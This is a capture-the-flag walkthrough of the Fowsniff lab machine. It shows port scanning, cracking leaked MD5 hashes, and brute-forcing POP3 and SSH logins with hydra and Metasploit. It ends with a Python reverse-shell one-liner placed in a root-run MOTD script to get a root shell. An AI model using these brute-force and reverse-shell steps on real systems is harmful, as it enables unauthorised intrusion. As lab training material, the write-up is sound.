@@ -1,0 +1,378 @@
+Lets start off with this machine.
+Its a simple machine and hints are on the way.
+IP: 10.10.68.237
+
+First we will start off by scanning the ports.
+
+-> nmap -A -T4 10.10.68.237
+
+PORT      STATE    SERVICE     VERSION
+22/tcp    open     ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 90:35:66:f4:c6:d2:95:12:1b:e8:cd:de:aa:4e:03:23 (RSA)
+|   256 53:9d:23:67:34:cf:0a:d5:5a:9a:11:74:bd:fd:de:71 (ECDSA)
+|_  256 a2:8f:db:ae:9e:3d:c9:e6:a9:ca:03:b1:d7:1b:66:83 (ED25519)
+80/tcp    open     http        Apache httpd 2.4.18 ((Ubuntu))
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-title: Fowsniff Corp - Delivering Solutions
+110/tcp   open     pop3        Dovecot pop3d
+|_pop3-capabilities: TOP USER CAPA RESP-CODES AUTH-RESP-CODE SASL(PLAIN) UIDL PIPELINING
+143/tcp   open     imap        Dovecot imapd
+1067/tcp  filtered instl_boots
+2007/tcp  filtered dectalk
+5988/tcp  filtered wbem-http
+9535/tcp  filtered man
+32781/tcp filtered unknown
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=9/18%OT=22%CT=1%CU=37471%PV=Y%DS=2%DC=T%G=Y%TM=5F64B36
+OS:9%P=x86_64-pc-linux-gnu)SEQ(SP=EE%GCD=2%ISR=107%TI=Z%CI=RD%TS=A)SEQ(SP=E
+OS:D%GCD=1%ISR=107%TI=Z%TS=8)SEQ(TI=Z%TS=B)OPS(O1=M508ST11NW6%O2=M508ST11NW
+OS:6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST11NW6%O6=M508ST11)WIN(W1=68DF%
+OS:W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508N
+OS:NSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=
+OS:Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=A
+OS:R%O=%RD=0%Q=)T5(R=N)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%D
+OS:F=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN
+OS:=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=N)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 5900/tcp)
+HOP RTT       ADDRESS
+1   151.34 ms 10.9.0.1
+2   151.34 ms 10.10.68.237
+
+
+We found a lot of ports opened now lets try to enumerate all of them one by one.
+As you can see ssh is open so if we tend to exploit any username or password we can try to login through it.
+
+Using Google, can you find any public information about them?
+
+As you can see that they have something publicly available so I found this line on their website.
+
+There was breach happened earlier on their systems and now all the users have changed their passwords.But I think there might be someone
+who forgot to do this.
+The attackers were also able to hijack our official @fowsniffcorp Twitter account. All of our official tweets have been deleted and the attackers may release sensitive information via this medium. We are working to resolve this at soon as possible.
+
+See they have twitter account so I searched for their account and found something amazing.
+
+
+FowSniffCorp Pwned!
+@FowsniffCorp
+·
+Mar 10, 2018
+lol gr8 security @FowsniffCorp
+ - too bad I'm dumping all your passwords!
+FowsniffCorp - Pastebin.com
+Pastebin.com is the number one paste tool since 2002. Pastebin is a website where you can store text online for a set period of time.
+pastebin.com
+
+So I was able to get the hashes.
+
+
+mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
+mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
+tegel@fowsniff:1dc352435fecca338acfd4be10984009
+baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
+seina@fowsniff:90dc16d47114aa13671c697fd506cf26
+stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
+mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
+parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
+sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
+ 
+Fowsniff Corporation Passwords LEAKED!
+FOWSNIFF CORP PASSWORD DUMP!
+ 
+Here are their email passwords dumped from their databases.
+They left their pop3 server WIDE OPEN, too!
+ 
+MD5 is insecure, so you shouldn't have trouble cracking them but I was too lazy haha =P
+ 
+l8r n00bz!
+ 
+B1gN1nj4
+
+mauer : ######
+mustikka:#######
+tegel:######
+baksteen:######
+seina:######
+stone:Not found
+mursten:#######
+parede:######
+sciana:######
+
+So got the password for all the hashes except stone(You can crack the hashes at Crackstaion).
+
+So I used hydra first to brute force ssh but no luck.. :(
+
+So then I went for pop3 server and it gave me a positive result ..Thank god : )
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Fowsniff# hydra -L user.txt -P pass.txt -f 10.10.68.237 -s 110 pop3
+
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-18 19:14:09
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 72 login tries (l:8/p:9), ~5 tries per task
+[DATA] attacking pop3://10.10.68.237:110/
+[A[110][pop3] host: 10.10.68.237   login: #####  password: ######
+[STATUS] attack finished for 10.10.68.237 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-18 19:14:47
+
+So lets see what we can find from that user.
+
+I am going to be using netcat to connect to pop3 server with these credentials.
+
+nc 10.10.68.237 110
+
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Fowsniff# nc 10.10.68.237 110
++OK Welcome to the Fowsniff Corporate Mail Server!
+USER #####
++OK
+PASS #########
++OK Logged in.
+LIST
++OK 2 messages:
+1 1622
+2 1280
+.
+retr 1
++OK 1622 octets
+Return-Path: <stone@fowsniff>
+X-Original-To: seina@fowsniff
+Delivered-To: seina@fowsniff
+Received: by fowsniff (Postfix, from userid 1000)
+        id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
+To: baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,
+    mustikka@fowsniff, parede@fowsniff, sciana@fowsniff, seina@fowsniff,
+    tegel@fowsniff
+Subject: URGENT! Security EVENT!
+Message-Id: <20180313185107.0FA3916A@fowsniff>
+Date: Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
+From: stone@fowsniff (stone)
+
+Dear All,
+
+A few days ago, a malicious actor was able to gain entry to
+our internal email systems. The attacker was able to exploit
+incorrectly filtered escape characters within our SQL database
+to access our login credentials. Both the SQL and authentication
+system used legacy methods that had not been updated in some time.
+
+We have been instructed to perform a complete internal system
+overhaul. While the main systems are "in the shop," we have
+moved to this isolated, temporary server that has minimal
+functionality.
+
+This server is capable of sending and receiving emails, but only
+locally. That means you can only send emails to other users, not
+to the world wide web. You can, however, access this system via 
+the SSH protocol.
+
+The temporary password for SSH is "##############"
+
+You MUST change this password as soon as possible, and you will do so under my
+guidance. I saw the leak the attacker posted online, and I must say that your
+passwords were not very secure.
+
+Come see me in my office at your earliest convenience and we'll set it up.
+
+Thanks,
+A.J Stone
+
+So some of them have their password as mentioned above and I tried for seina but it failed.
+
+So made a list of users 
+
+baksteen
+mauer
+mursten
+seina
+skyler
+devin
+
+
+msf6 auxiliary(scanner/ssh/ssh_login) > set user_file /home/akshay/Desktop/Fowsniff/brute-users.txt
+user_file => /home/akshay/Desktop/Fowsniff/brute-users.txt
+msf6 auxiliary(scanner/ssh/ssh_login) > set password S1ck3nBluff+secureshell
+password => S1ck3nBluff+secureshell
+msf6 auxiliary(scanner/ssh/ssh_login) > set rhosts 10.10.68.237
+rhosts => 10.10.68.237
+msf6 auxiliary(scanner/ssh/ssh_login) > exploit
+
+[+] 10.10.68.237:22 - Success: 'baksteen:#############' 'uid=1004(baksteen) gid=100(users) groups=100(users),1001(baksteen) Linux fowsniff 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux 
+
+Voila that was smooth :P
+
+
+
+root@LAPTOP-U5913CMD:/home/akshay# ssh baksteen@10.10.18.189
+baksteen@10.10.18.189's password: 
+
+                            _____                       _  __  __  
+      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
+   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
+.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
+-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
+-:      y.      dssssssso                ____                      
+-:      y.      dssssssso               / ___|___  _ __ _ __        
+-:      y.      dssssssso              | |   / _ \| '__| '_ \     
+-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
+-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
+-:    .+mdddddddmyyyyyhy:                              |_|        
+-: -odMMMMMMMMMMmhhdy/.    
+.ohdddddddddddddho:                  Delivering Solutions
+
+
+   ****  Welcome to the Fowsniff Corporate Server! **** 
+
+              ---------- NOTICE: ----------
+
+ * Due to the recent security breach, we are running on a very minimal system.
+ * Contact AJ Stone -IMMEDIATELY- about changing your email and SSH passwords.
+
+
+Last login: Tue Mar 13 16:55:40 2018 from 192.168.7.36
+baksteen@fowsniff:~$ id
+uid=1004(baksteen) gid=100(users) groups=100(users),1001(baksteen)
+baksteen@fowsniff:~$ 
+
+Lets try to gain root shell : )
+
+Actually the question was any file related to the users group.
+
+baksteen@fowsniff:/$ find / -group users 2>/dev/null
+/opt/cube/cube.sh    *This looks interesting*
+/run/user/1004
+/run/user/1004/systemd
+/run/user/1004/systemd/private
+/run/user/1004/systemd/notify
+/home/baksteen/.cache
+/home/baksteen/.cache/motd.legal-displayed
+/home/baksteen/Maildir
+/home/baksteen/Maildir/tmp
+/home/baksteen/Maildir/dovecot-uidvalidity
+/home/baksteen/Maildir/dovecot.index.log
+/home/baksteen/Maildir/cur
+/home/baksteen/Maildir/new
+/home/baksteen/Maildir/new/1520967067.V801I23764M196461.fowsniff
+/home/baksteen/Maildir/dovecot-uidlist
+/home/baksteen/Maildir/dovecot-uidvalidity.5aa21fac
+/home/baksteen/.viminfo
+/home/baksteen/.bash_history
+
+
+This cube.sh is the file that gets displayed when we try to login via ssh
+So lets see the file and edit some contents in it to get a reverse shell.
+
+
+baksteen@fowsniff:/etc/update-motd.d$ cat 00-header 
+#!/bin/sh
+#
+#    00-header - create the header of the MOTD
+#    Copyright (C) 2009-2010 Canonical Ltd.
+#
+#    Authors: Dustin Kirkland <kirkland@canonical.com>
+#
+#    This program is free software; you can redistribute it and/or modify
+#    it under the terms of the GNU General Public License as published by
+#    the Free Software Foundation; either version 2 of the License, or
+#    (at your option) any later version.
+#
+#    This program is distributed in the hope that it will be useful,
+#    but WITHOUT ANY WARRANTY; without even the implied warranty of
+#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+#    GNU General Public License for more details.
+#
+#    You should have received a copy of the GNU General Public License along
+#    with this program; if not, write to the Free Software Foundation, Inc.,
+#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
+
+#[ -r /etc/lsb-release ] && . /etc/lsb-release
+
+#if [ -z "$DISTRIB_DESCRIPTION" ] && [ -x /usr/bin/lsb_release ]; then
+#       # Fall back to using the very slow lsb_release utility
+#       DISTRIB_DESCRIPTION=$(lsb_release -s -d)
+#fi
+
+#printf "Welcome to %s (%s %s %s)\n" "$DISTRIB_DESCRIPTION" "$(uname -o)" "$(uname -r)" "$(uname -m)"
+
+sh /opt/cube/cube.sh
+baksteen@fowsniff:/etc/update-motd.d$ 
+
+
+See we can get reverse shell as root.
+
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<IP>,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+I will be using python3 to get a reverse shell.
+
+Now I will again try to connect to ssh and I fired up netcat listener at port 1234
+
+root@LAPTOP-U5913CMD:/home/akshay# nc -nvlp 1234
+Listening on 0.0.0.0 1234
+
+Cool we got reverse shell as root
+
+root@LAPTOP-U5913CMD:/home/akshay# nc -nvlp 1234
+Listening on 0.0.0.0 1234
+Connection received on 10.10.18.189 52100
+/bin/sh: 0: can't access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# 
+
+# cd /root
+# ls
+Maildir
+flag.txt
+# cat flag.txt
+   ___                        _        _      _   _             _ 
+  / __|___ _ _  __ _ _ _ __ _| |_ _  _| |__ _| |_(_)___ _ _  __| |
+ | (__/ _ \ ' \/ _` | '_/ _` |  _| || | / _` |  _| / _ \ ' \(_-<_|
+  \___\___/_||_\__, |_| \__,_|\__|\_,_|_\__,_|\__|_\___/_||_/__(_)
+               |___/ 
+
+ (_)
+  |--------------
+  |&&&&&&&&&&&&&&|
+  |    R O O T   |
+  |    F L A G   |
+  |&&&&&&&&&&&&&&|
+  |--------------
+  |
+  |
+  |
+  |
+  |
+  |
+ ---
+
+Nice work!
+
+This CTF was built with love in every byte by @berzerk0 on Twitter.
+
+Special thanks to psf, @nbulischeck and the whole Fofao Team.
+
+# flag.txt
+# cat flag.txt
+   ___                        _        _      _   _             _ 
+  / __|___ _ _  __ _ _ _ __ _| |_ _  _| |__ _| |_(_)___ _ _  __| |
+ | (__/ _ \ ' \/ _` | '_/ _` |  _| || | / _` |  _| / _ \ ' \(_-<_|
+  \___\___/_||_\__, |_| \__,_|\__|\_,_|_\__,_|\__|_\___/_||_/__(_)
+               |___/ 
+
+ (_)
+  |--------------
+  |&&&&&&&&&&&&&&|
+  |    R O O T   |
+  |    F L A G   |
+  |&&&&&&&&&&&&&&|
+
+Thank you...Happy Hacking :)
